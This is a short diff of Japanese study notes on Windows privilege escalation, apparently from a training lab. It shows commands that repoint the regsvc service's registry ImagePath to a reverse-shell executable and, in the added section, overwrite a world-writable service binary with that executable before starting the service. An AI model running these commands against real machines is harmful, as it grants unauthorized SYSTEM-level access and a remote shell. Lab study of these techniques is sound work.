@@ -22,3 +22,11 @@ regsvc service のレジストリを NT AUTHORITY\INTERACTIVE に所属するユ
 以下の手順で、レジストリの追加し、サービスを起動する。
 reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
 net start regsvc
+
+4. filepermsvc を利用したリバースシェルの実行
+・条件
+filepermservice.exe を誰でも書込可能なこと
+・方法
+バイナリを置き換えてサービスを起動する。
+copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
+net start filepermsvc
